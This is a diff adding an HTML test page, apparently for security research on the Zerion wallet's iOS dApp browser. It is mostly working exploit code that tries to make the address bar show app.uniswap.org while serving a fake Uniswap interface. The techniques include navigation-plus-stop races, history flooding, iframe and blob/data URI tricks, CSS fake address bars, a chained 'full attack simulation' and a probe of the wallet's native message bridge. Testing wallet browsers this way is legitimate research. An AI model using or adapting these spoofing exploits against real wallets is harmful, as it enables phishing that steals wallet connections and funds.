@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Wallet Browser Spoof Tests</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, system-ui, sans-serif; padding: 16px; background: #0d0d12; color: #eee; padding-bottom: 60px; }
+        h2 { margin-bottom: 6px; font-size: 18px; }
+        .sub { color: #888; font-size: 12px; margin-bottom: 16px; }
+        .cat { color: #2cb67d; font-size: 13px; font-weight: 700; margin: 18px 0 6px; text-transform: uppercase; letter-spacing: 1px; }
+        .test { background: #1a1a2e; border: 1px solid #333; border-radius: 10px; padding: 14px; margin: 8px 0; }
+        .test h3 { color: #7f5af0; font-size: 14px; margin-bottom: 4px; }
+        .desc { color: #888; font-size: 11px; line-height: 1.5; margin-bottom: 8px; }
+        button { width: 100%; padding: 12px; background: #7f5af0; color: #fff; border: none; border-radius: 8px; font-size: 14px; cursor: pointer; margin: 2px 0; }
+        button:active { background: #6b46e5; }
+        .result { margin-top: 8px; padding: 8px; background: #111; border-radius: 6px; font-size: 11px; color: #aaa; display: none; word-break: break-all; }
+        .high { border-left: 3px solid #e53170; }
+        .crit { border-left: 3px solid #ff4444; }
+    </style>
+</head>
+<body>
+
+<h2>Zerion Wallet Browser — Spoof Tests</h2>
+<p class="sub">Open this page inside Zerion's dApp browser on iOS. Each test attempts to make the address bar show a different URL.</p>
+
+<!-- ============================================ -->
+<!-- A: Failed Navigation Spoof (Zellic technique) -->
+<!-- ============================================ -->
+<p class="cat">A: Failed Navigation Spoof</p>
+
+<div class="test crit">
+    <h3>A1. location + window.stop()</h3>
+    <p class="desc">Navigate to uniswap.org then immediately cancel with window.stop().
+    The wallet's onNavigationStateChange fires with the target URL,
+    but content stays on this page. Address bar may show uniswap.org.</p>
+    <button onclick="testA1()">Test A1</button>
+    <div class="result" id="rA1"></div>
+</div>
+
+<div class="test crit">
+    <h3>A2. Timing variations (10ms-500ms)</h3>
+    <p class="desc">Same as A1 but with different delays before window.stop().
+    Tests various race windows between navigation start and cancellation.</p>
+    <button onclick="testA2(10)">10ms</button>
+    <button onclick="testA2(50)">50ms</button>
+    <button onclick="testA2(100)">100ms</button>
+    <button onclick="testA2(200)">200ms</button>
+    <button onclick="testA2(500)">500ms</button>
+    <div class="result" id="rA2"></div>
+</div>
+
+<div class="test crit">
+    <h3>A3. In new window + stop()</h3>
+    <p class="desc">Opens about:blank, writes attacker content, then navigates
+    to legitimate URL + stops. The new window's address bar may update.</p>
+    <button onclick="testA3()">Test A3</button>
+</div>
+
+<div class="test crit">
+    <h3>A4. setInterval loop (AlphaWallet technique)</h3>
+    <p class="desc">Continuously navigate + stop in a loop using setInterval.
+    This was the exact technique that worked on AlphaWallet, MetaMask,
+    Trust Wallet, and other top wallets.</p>
+    <button onclick="testA4()">Test A4</button>
+</div>
+
+<div class="test high">
+    <h3>A5. location.replace + stop()</h3>
+    <p class="desc">Uses location.replace() instead of location.href assignment.
+    replace() doesn't add history entry — might bypass history-based URL tracking.</p>
+    <button onclick="testA5()">Test A5</button>
+    <div class="result" id="rA5"></div>
+</div>
+
+<!-- ============================================ -->
+<!-- B: History API Manipulation                   -->
+<!-- ============================================ -->
+<p class="cat">B: History API</p>
+
+<div class="test high">
+    <h3>B1. pushState path spoofing</h3>
+    <p class="desc">pushState can change the displayed path. If the wallet shows full URL
+    (not just hostname), we can make the path look like a legitimate dApp.
+    e.g., /app.uniswap.org/swap</p>
+    <button onclick="testB1()">Test B1</button>
+    <div class="result" id="rB1"></div>
+</div>
+
+<div class="test high">
+    <h3>B2. pushState + navigate race</h3>
+    <p class="desc">pushState to a spoofed path, then immediately navigate to about:blank.
+    During the transition, the address bar might flash the pushState URL.</p>
+    <button onclick="testB2()">Test B2</button>
+</div>
+
+<div class="test high">
+    <h3>B3. History flood + navigation</h3>
+    <p class="desc">Push 200 history entries rapidly then navigate. The history stack
+    overflow might confuse the wallet's URL tracking logic.</p>
+    <button onclick="testB3()">Test B3</button>
+</div>
+
+<!-- ============================================ -->
+<!-- C: Window Manipulation                        -->
+<!-- ============================================ -->
+<p class="cat">C: Window / Tab</p>
+
+<div class="test crit">
+    <h3>C1. window.open + document.write</h3>
+    <p class="desc">Open uniswap.org in new window, wait for URL bar update,
+    then navigate to about:blank and write fake content.
+    Address bar may keep showing uniswap.org.</p>
+    <button onclick="testC1()">Test C1</button>
+</div>
+
+<div class="test crit">
+    <h3>C2. Named window replacement</h3>
+    <p class="desc">Open uniswap.org with name 'w', then reopen about:blank with same name
+    and write fake dApp. Named window reuse may preserve the original URL display.</p>
+    <button onclick="testC2()">Test C2</button>
+</div>
+
+<div class="test high">
+    <h3>C3. about:blank inherits opener origin</h3>
+    <p class="desc">In some WebView implementations, about:blank inherits the
+    opener's origin. If so, the address bar might show the parent page's URL.</p>
+    <button onclick="testC3()">Test C3</button>
+</div>
+
+<div class="test high">
+    <h3>C4. Blob URL</h3>
+    <p class="desc">Create a blob: URL with fake dApp content. Wallet might show
+    "blob:https://..." or nothing useful in the address bar, hiding the true origin.</p>
+    <button onclick="testC4()">Test C4</button>
+</div>
+
+<!-- ============================================ -->
+<!-- D: iframe / Sandbox                           -->
+<!-- ============================================ -->
+<p class="cat">D: iframe Spoofing</p>
+
+<div class="test crit">
+    <h3>D1. Full-screen srcdoc iframe</h3>
+    <p class="desc">Create a full-screen srcdoc iframe with fake dApp UI.
+    Address bar shows THIS page's URL while content is completely attacker-controlled.
+    User sees fake "Connect Wallet" on what appears to be a legitimate domain.</p>
+    <button onclick="testD1()">Test D1</button>
+</div>
+
+<div class="test high">
+    <h3>D2. sandbox + allow-top-navigation</h3>
+    <p class="desc">iframe with sandbox="allow-scripts allow-top-navigation" tries to
+    navigate the top frame. Worked on Arc iOS — might work on Zerion's WKWebView too.</p>
+    <button onclick="testD2()">Test D2</button>
+</div>
+
+<div class="test high">
+    <h3>D3. iframe bridge abuse</h3>
+    <p class="desc">Child iframes in WKWebView can access window.webkit.messageHandlers
+    without origin verification. Try to call the wallet's bridge from a cross-origin iframe.</p>
+    <button onclick="testD3()">Test D3</button>
+    <div class="result" id="rD3"></div>
+</div>
+
+<!-- ============================================ -->
+<!-- E: Scheme / Protocol                          -->
+<!-- ============================================ -->
+<p class="cat">E: Scheme Confusion</p>
+
+<div class="test high">
+    <h3>E1. data: URI</h3>
+    <p class="desc">Navigate to data: URI with fake dApp page. Some wallet browsers
+    show "data:" or nothing in address bar, hiding the attacker's control.</p>
+    <button onclick="testE1()">Test E1</button>
+</div>
+
+<div class="test high">
+    <h3>E2. javascript: URI</h3>
+    <p class="desc">Try javascript: URI execution. If not blocked, we can modify
+    the page content while the URL bar stays unchanged.</p>
+    <button onclick="testE2()">Test E2</button>
+    <div class="result" id="rE2"></div>
+</div>
+
+<div class="test">
+    <h3>E3. ethereum: / wc: scheme</h3>
+    <p class="desc">Test if ethereum: or wc: (WalletConnect) URIs cause
+    address bar inconsistency during the app handoff.</p>
+    <button onclick="testE3('ethereum')">ethereum:</button>
+    <button onclick="testE3('wc')">wc:</button>
+    <div class="result" id="rE3"></div>
+</div>
+
+<!-- ============================================ -->
+<!-- F: UI Overlay                                 -->
+<!-- ============================================ -->
+<p class="cat">F: UI Overlay</p>
+
+<div class="test crit">
+    <h3>F1. CSS overlay fake address bar</h3>
+    <p class="desc">Creates a position:fixed element at the top that mimics Zerion's
+    address bar UI, showing "app.uniswap.org". The real address bar is scrolled
+    away or hidden behind this overlay. Most reliable technique on mobile wallets.</p>
+    <button onclick="testF1()">Test F1</button>
+</div>
+
+<div class="test high">
+    <h3>F2. Scroll-away + fake bar</h3>
+    <p class="desc">If Zerion hides the address bar on scroll (like many mobile browsers),
+    scroll down to hide it, then show a CSS fake address bar in its place.</p>
+    <button onclick="testF2()">Test F2</button>
+</div>
+
+<!-- ============================================ -->
+<!-- G: Combined / Advanced                        -->
+<!-- ============================================ -->
+<p class="cat">G: Combined Attacks</p>
+
+<div class="test crit">
+    <h3>G1. stop() + overlay combo</h3>
+    <p class="desc">Combines: (1) location+stop to set URL bar, (2) CSS overlay as fallback
+    if stop() doesn't fully work. Double-layered spoofing for maximum reliability.</p>
+    <button onclick="testG1()">Test G1</button>
+</div>
+
+<div class="test crit">
+    <h3>G2. Full attack simulation</h3>
+    <p class="desc">Opens a new page with a complete fake Uniswap interface.
+    Tries every spoofing technique in sequence. Tests the full attack chain
+    a real attacker would use to steal wallet connections.</p>
+    <button onclick="testG2()">Test G2</button>
+</div>
+
+<script>
+const LEGIT = 'https://app.uniswap.org';
+const LEGIT2 = 'https://app.aave.com';
+
+// Fake DeFi UI template
+function fakeDApp(name, url) {
+    return `<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>${name}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#191b1f;color:#fff;min-height:100vh}
+.header{padding:16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #2c2f36}
+.logo{font-size:20px;font-weight:700;color:#ff007a}
+.connect{background:#ff007a;color:#fff;border:none;padding:10px 20px;border-radius:16px;font-size:14px;font-weight:600}
+.swap-box{max-width:480px;margin:40px auto;background:#212429;border-radius:24px;padding:16px;border:1px solid #2c2f36}
+.swap-title{font-size:16px;margin-bottom:16px}
+.input-box{background:#2c2f36;border-radius:20px;padding:16px;margin:4px 0}
+.input-box input{background:none;border:none;color:#fff;font-size:28px;width:60%;outline:none}
+.token{float:right;background:#2c2f36;border:1px solid #40444f;padding:6px 12px;border-radius:16px;font-size:14px;color:#fff}
+.arrow{text-align:center;padding:8px;font-size:20px;color:#8f96ac}
+.swap-btn{width:100%;padding:16px;background:#ff007a;color:#fff;border:none;border-radius:20px;font-size:18px;font-weight:600;margin-top:8px}
+.spoof-banner{position:fixed;bottom:0;left:0;right:0;background:#ff0000;color:#fff;text-align:center;padding:12px;font-size:14px;font-weight:700;z-index:9999}
+</style></head><body>
+<div class="header">
+    <div class="logo">${name === 'Uniswap' ? '\u{1F984}' : '\u{1F47B}'} ${name}</div>
+    <button class="connect" onclick="alert('SPOOFED - This is NOT ${name}!\\n\\nAddress bar shows: ${url}\\nReal origin: ' + window.location.origin)">Connect Wallet</button>
+</div>
+<div class="swap-box">
+    <div class="swap-title">Swap</div>
+    <div class="input-box">
+        <input type="text" placeholder="0" value="1.0">
+        <span class="token">ETH</span>
+    </div>
+    <div class="arrow">\u2193</div>
+    <div class="input-box">
+        <input type="text" placeholder="0" value="3,247.82" readonly>
+        <span class="token">USDC</span>
+    </div>
+    <button class="swap-btn" onclick="alert('SPOOFED!\\nThis would have drained your wallet.\\nReal origin: ' + window.location.origin)">Swap</button>
+</div>
+<div class="spoof-banner">SPOOFED PAGE - Check address bar - Real origin: <span id="real-origin"></span></div>
+<script>document.getElementById('real-origin').textContent = window.location.origin || window.location.href;<\/script>
+</body></html>`;
+}
+
+function show(id, msg) {
+    const el = document.getElementById(id);
+    if (el) { el.style.display = 'block'; el.textContent = msg; }
+}
+
+// ─── A: Failed Navigation Spoof ─────────────────────────
+
+// A1: location + window.stop()
+function testA1() {
+    show('rA1', 'Navigating to ' + LEGIT + ' then calling window.stop()...');
+    setTimeout(() => {
+        window.location.href = LEGIT;
+        window.stop();
+        show('rA1', 'window.stop() called. If address bar shows uniswap.org but this page is still visible = VULNERABLE');
+    }, 100);
+}
+
+// A2: Timing variations
+function testA2(delay) {
+    show('rA2', 'Testing with ' + delay + 'ms delay...');
+    window.location.href = LEGIT;
+    setTimeout(() => {
+        window.stop();
+        show('rA2', delay + 'ms: stop() called. Check address bar.');
+    }, delay);
+}
+
+// A3: In new window
+function testA3() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked — tap and hold to allow popups'); return; }
+    try {
+        w.document.open();
+        w.document.write(fakeDApp('Uniswap', LEGIT));
+        w.document.close();
+        // Now try to change the URL bar without changing content
+        setTimeout(() => {
+            try {
+                w.location.href = LEGIT;
+                setTimeout(() => { try { w.stop(); } catch(e){} }, 50);
+            } catch(e) {}
+        }, 500);
+    } catch(e) {}
+}
+
+// A4: setInterval loop (AlphaWallet technique)
+function testA4() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(`<!DOCTYPE html><html><head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Uniswap</title></head><body>
+${fakeDApp('Uniswap', LEGIT).replace(/<!DOCTYPE html>|<html>|<\/html>/g, '')}
+<script>
+// AlphaWallet technique: setInterval continuously spoofs URL
+var spoofInterval = setInterval(function() {
+    try {
+        window.location.href = '${LEGIT}';
+        window.stop();
+    } catch(e) { clearInterval(spoofInterval); }
+}, 500);
+// Also try location object tricks
+setTimeout(function() {
+    try { history.pushState({}, 'Uniswap', '${LEGIT}'); } catch(e) {}
+}, 200);
+<\/script></body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// A5: location.replace + stop
+function testA5() {
+    show('rA5', 'Trying location.replace() + stop()...');
+    setTimeout(() => {
+        window.location.replace(LEGIT);
+        window.stop();
+        show('rA5', 'replace+stop done. Check address bar.');
+    }, 100);
+}
+
+// ─── B: History API ─────────────────────────────────────
+
+// B1: pushState path spoof
+function testB1() {
+    try {
+        // Can only pushState same-origin paths
+        history.pushState({}, 'Uniswap', '/app.uniswap.org/swap?inputCurrency=ETH&outputCurrency=USDC');
+        document.title = 'Uniswap Interface';
+        show('rB1', 'pushState done. Path now shows /app.uniswap.org/swap... Check if wallet shows full path or just hostname.');
+
+        // Also try cross-origin (will likely fail)
+        try {
+            history.pushState({}, 'Uniswap', LEGIT + '/swap');
+            show('rB1', 'Cross-origin pushState WORKED! This is vulnerable.');
+        } catch(e) {
+            show('rB1', 'Cross-origin pushState blocked (expected). Path changed to: ' + window.location.pathname);
+        }
+    } catch(e) {
+        show('rB1', 'pushState failed: ' + e.message);
+    }
+}
+
+// B2: pushState + navigate race
+function testB2() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(`<html><body>
+<script>
+history.pushState({}, 'Uniswap', '/swap?inputCurrency=ETH');
+document.title = 'Uniswap';
+// Navigate away — address bar might flash the pushState URL
+setTimeout(function() {
+    window.location.href = 'about:blank';
+    setTimeout(function() {
+        document.open();
+        document.write('${fakeDApp('Uniswap', LEGIT).replace(/'/g, "\\'")}');
+        document.close();
+    }, 100);
+}, 500);
+<\/script></body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// B3: History flood
+function testB3() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(`<html><body>
+<script>
+// Flood history
+for (var i = 0; i < 200; i++) {
+    history.pushState({i:i}, '', '/swap/pool/' + i);
+}
+// Final pushState with spoofed path
+history.pushState({}, 'Uniswap', '/app.uniswap.org/swap');
+document.title = 'Uniswap';
+setTimeout(function() {
+    document.open();
+    document.write('${fakeDApp('Uniswap', LEGIT).replace(/'/g, "\\'")}');
+    document.close();
+}, 300);
+<\/script></body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// ─── C: Window Manipulation ─────────────────────────────
+
+// C1: window.open + document.write
+function testC1() {
+    let w = window.open(LEGIT, '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    // Wait for URL bar to update to uniswap.org, then replace content
+    setTimeout(() => {
+        try {
+            w.location.href = 'about:blank';
+            setTimeout(() => {
+                try {
+                    w.document.open();
+                    w.document.write(fakeDApp('Uniswap', LEGIT));
+                    w.document.close();
+                } catch(e) {}
+            }, 200);
+        } catch(e) {}
+    }, 3000);
+}
+
+// C2: Named window replacement
+function testC2() {
+    window.open(LEGIT, 'w');
+    setTimeout(() => {
+        let w = window.open('about:blank', 'w');
+        if (w) {
+            try {
+                w.document.open();
+                w.document.write(fakeDApp('Uniswap', LEGIT));
+                w.document.close();
+            } catch(e) {}
+        }
+    }, 3000);
+}
+
+// C3: about:blank origin inheritance
+function testC3() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(fakeDApp('Uniswap', 'about:blank'));
+        w.document.close();
+    } catch(e) {}
+}
+
+// C4: Blob URL
+function testC4() {
+    let html = fakeDApp('Uniswap', 'blob:');
+    let blob = new Blob([html], { type: 'text/html' });
+    let url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+}
+
+// ─── D: iframe Spoofing ─────────────────────────────────
+
+// D1: Full-screen srcdoc iframe
+function testD1() {
+    // Hide everything and show full-screen iframe
+    document.body.innerHTML = '';
+    document.body.style.margin = '0';
+    document.body.style.padding = '0';
+    document.body.style.overflow = 'hidden';
+
+    let iframe = document.createElement('iframe');
+    iframe.srcdoc = fakeDApp('Uniswap', window.location.href + ' (srcdoc)');
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;';
+    document.body.appendChild(iframe);
+}
+
+// D2: sandbox + allow-top-navigation
+function testD2() {
+    let iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts allow-top-navigation';
+    iframe.srcdoc = `<html><body><script>
+        setTimeout(function() {
+            try { top.location.href = '${LEGIT}'; } catch(e) {
+                // If can't navigate top, try other schemes
+                try { top.location.href = 'ethereum:pay-0x0000000000000000000000000000000000000000'; } catch(e2) {}
+            }
+        }, 500);
+    <\/script></body></html>`;
+    iframe.style.cssText = 'width:0;height:0;border:none;position:absolute;';
+    document.body.appendChild(iframe);
+}
+
+// D3: iframe bridge abuse
+function testD3() {
+    let results = [];
+
+    // Check what message handlers exist
+    try {
+        let handlers = window.webkit && window.webkit.messageHandlers;
+        if (handlers) {
+            results.push('webkit.messageHandlers EXISTS');
+            // Try common wallet bridge names
+            ['zerion', 'zerionWallet', 'callback', 'observe',
+             'ReactNativeWebView', 'webViewBridge', 'dappBridge',
+             'ethereum', 'web3', 'postMessage'].forEach(name => {
+                try {
+                    if (handlers[name]) {
+                        results.push('FOUND: ' + name);
+                    }
+                } catch(e) {
+                    results.push(name + ': ' + e.message);
+                }
+            });
+        } else {
+            results.push('No webkit.messageHandlers (not in WKWebView or not exposed)');
+        }
+    } catch(e) {
+        results.push('webkit check error: ' + e.message);
+    }
+
+    // Check window.ethereum (injected by wallet)
+    if (window.ethereum) {
+        results.push('window.ethereum EXISTS');
+        results.push('isZerion: ' + !!window.ethereum.isZerion);
+        results.push('isMetaMask: ' + !!window.ethereum.isMetaMask);
+        try {
+            results.push('chainId: ' + window.ethereum.chainId);
+        } catch(e) {}
+    } else {
+        results.push('No window.ethereum');
+    }
+
+    // Check for Zerion-specific globals
+    ['zerion', '__zerion', 'zerionWallet'].forEach(name => {
+        if (window[name]) results.push('window.' + name + ' EXISTS');
+    });
+
+    show('rD3', results.join('\n'));
+}
+
+// ─── E: Scheme Confusion ────────────────────────────────
+
+// E1: data: URI
+function testE1() {
+    let encoded = btoa(fakeDApp('Uniswap', 'data: URI'));
+    window.open('data:text/html;base64,' + encoded, '_blank');
+}
+
+// E2: javascript: URI
+function testE2() {
+    try {
+        // Try via window.open
+        let w = window.open('javascript:void(0)', '_blank');
+        if (w) {
+            try {
+                w.document.open();
+                w.document.write(fakeDApp('Uniswap', 'javascript:'));
+                w.document.close();
+                show('rE2', 'javascript: URI opened! Check address bar.');
+            } catch(e) {
+                show('rE2', 'Could not write to javascript: window: ' + e.message);
+            }
+        } else {
+            show('rE2', 'javascript: window.open blocked');
+        }
+    } catch(e) {
+        show('rE2', 'javascript: URI blocked: ' + e.message);
+    }
+
+    // Also try via link click
+    let a = document.createElement('a');
+    a.href = "javascript:void(document.title='Uniswap')";
+    a.click();
+}
+
+// E3: ethereum/wc scheme
+function testE3(scheme) {
+    let urls = {
+        'ethereum': 'ethereum:pay-0x0000000000000000000000000000000000000000@1/transfer?address=0x0000000000000000000000000000000000000000&uint256=1e18',
+        'wc': 'wc:00e46b69-d0cc-4b3e-b6a2-cee442f97188@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=abcdef1234567890'
+    };
+    try {
+        window.location.href = urls[scheme];
+        setTimeout(() => {
+            show('rE3', scheme + ': scheme triggered. Check if address bar changed.');
+        }, 1000);
+    } catch(e) {
+        show('rE3', scheme + ': blocked — ' + e.message);
+    }
+}
+
+// ─── F: UI Overlay ──────────────────────────────────────
+
+// F1: CSS overlay fake address bar
+function testF1() {
+    // Clear page and create full fake browser UI
+    document.body.innerHTML = '';
+    document.body.style.cssText = 'margin:0;padding:0;background:#191b1f;overflow-x:hidden;';
+    document.title = 'Uniswap';
+
+    // Fake address bar that sits at the very top
+    let fakeBar = document.createElement('div');
+    fakeBar.innerHTML = `
+    <div style="position:fixed;top:0;left:0;right:0;z-index:100000;
+        background:#1a1a2e;padding:env(safe-area-inset-top, 0px) 12px 8px 12px;
+        border-bottom:1px solid #333;">
+        <div style="background:#2a2a3e;border-radius:10px;padding:10px 14px;
+            display:flex;align-items:center;margin-top:8px;">
+            <span style="color:#2cb67d;font-size:13px;margin-right:6px;">&#128274;</span>
+            <span style="color:#eee;font-size:14px;font-family:-apple-system,system-ui;">app.uniswap.org</span>
+        </div>
+    </div>`;
+    document.body.appendChild(fakeBar);
+
+    // Fake dApp content below the fake bar
+    let content = document.createElement('div');
+    content.style.cssText = 'padding-top:80px;';
+    content.innerHTML = fakeDApp('Uniswap', 'OVERLAY SPOOF').replace(/<html>|<\/html>|<head>.*?<\/head>|<!DOCTYPE html>/gs, '');
+    document.body.appendChild(content);
+
+    // Red warning at bottom
+    let warn = document.createElement('div');
+    warn.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:red;color:white;text-align:center;padding:8px;font-size:12px;z-index:100001;';
+    warn.textContent = 'SPOOF: The address bar above is FAKE CSS. Real URL: ' + window.location.href;
+    document.body.appendChild(warn);
+}
+
+// F2: Scroll-away + fake bar
+function testF2() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(`<!DOCTYPE html><html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Uniswap</title></head>
+<body style="margin:0;padding:0;background:#191b1f;">
+<!-- Tall spacer to enable scrolling and hide real address bar -->
+<div style="height:120vh;"></div>
+
+<!-- Fake address bar appears after scrolling -->
+<div id="fakebar" style="position:fixed;top:0;left:0;right:0;z-index:99999;
+    background:#1a1a2e;padding:12px;display:none;
+    padding-top:env(safe-area-inset-top, 12px);">
+    <div style="background:#2a2a3e;border-radius:10px;padding:10px 14px;
+        display:flex;align-items:center;">
+        <span style="color:#2cb67d;font-size:13px;margin-right:6px;">&#128274;</span>
+        <span style="color:#eee;font-size:14px;">app.uniswap.org</span>
+    </div>
+</div>
+
+<!-- Fake dApp content -->
+<div id="content" style="position:fixed;top:0;left:0;right:0;bottom:0;z-index:99998;display:none;overflow-y:auto;">
+    <div style="padding-top:60px;">
+        ${fakeDApp('Uniswap', 'SCROLL SPOOF').replace(/<!DOCTYPE html>|<html>|<\/html>|<head>[\s\S]*?<\/head>/g, '').replace(/'/g, "\\'")}
+    </div>
+</div>
+
+<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#888;z-index:1;">
+    <p style="font-size:20px;">&#8595; Scroll down &#8595;</p>
+    <p style="font-size:12px;">This hides the real address bar</p>
+</div>
+
+<script>
+var triggered = false;
+window.addEventListener('scroll', function() {
+    if (window.scrollY > 100 && !triggered) {
+        triggered = true;
+        document.getElementById('fakebar').style.display = 'block';
+        document.getElementById('content').style.display = 'block';
+        // Scroll to top of the fake content
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+});
+// Auto-scroll after 2 seconds
+setTimeout(function() {
+    window.scrollTo({top: 200, behavior: 'smooth'});
+}, 1500);
+<\/script>
+</body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+
+// ─── G: Combined Attacks ────────────────────────────────
+
+// G1: stop() + overlay combo
+function testG1() {
+    // First try location + stop
+    let stopped = false;
+    try {
+        window.location.href = LEGIT;
+        window.stop();
+        stopped = true;
+    } catch(e) {}
+
+    // Whether or not stop worked, also add overlay
+    setTimeout(() => {
+        testF1(); // Apply the CSS overlay
+    }, stopped ? 200 : 0);
+}
+
+// G2: Full attack simulation
+function testG2() {
+    let w = window.open('about:blank', '_blank');
+    if (!w) { alert('Popup blocked'); return; }
+    try {
+        w.document.open();
+        w.document.write(`<!DOCTYPE html><html>
+<head><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Uniswap</title></head>
+<body style="margin:0;background:#191b1f;">
+<script>
+var results = [];
+
+// Technique 1: Try pushState cross-origin
+try {
+    history.pushState({}, 'Uniswap', '${LEGIT}/swap');
+    results.push('pushState cross-origin: SUCCESS');
+} catch(e) {
+    results.push('pushState cross-origin: blocked');
+    // Fallback: same-origin path
+    try {
+        history.pushState({}, 'Uniswap', '/app.uniswap.org/swap');
+        results.push('pushState path: done');
+    } catch(e2) {}
+}
+
+// Technique 2: Try location + stop loop
+var attempts = 0;
+var spoofLoop = setInterval(function() {
+    attempts++;
+    if (attempts > 5) { clearInterval(spoofLoop); return; }
+    try {
+        window.location.href = '${LEGIT}';
+        window.stop();
+        results.push('stop() attempt ' + attempts);
+    } catch(e) {
+        clearInterval(spoofLoop);
+    }
+}, 300);
+
+// After attempts, write the fake UI
+setTimeout(function() {
+    clearInterval(spoofLoop);
+    document.title = 'Uniswap';
+
+    // Write status + fake app
+    document.open();
+    document.write('<html><body style="margin:0;background:#191b1f;">' +
+        // Show results
+        '<div style="position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;padding:8px;z-index:99999;font-size:10px;color:#888;font-family:monospace;max-height:100px;overflow:auto;">' +
+        results.map(function(r){return '<div>'+r+'</div>'}).join('') +
+        '</div>' +
+        '${fakeDApp('Uniswap', LEGIT).replace(/<!DOCTYPE html>|<html>|<\/html>|<head>[\s\S]*?<\/head>/g, '').replace(/'/g, "\\'")}' +
+    '</body></html>');
+    document.close();
+}, 2500);
+<\/script>
+<div style="color:#888;text-align:center;padding:40px;">
+    <p>Running spoof techniques...</p>
+    <p style="font-size:12px;margin-top:8px;">Testing pushState, location+stop, setInterval...</p>
+</div>
+</body></html>`);
+        w.document.close();
+    } catch(e) {}
+}
+</script>
+
+</body>
+</html>
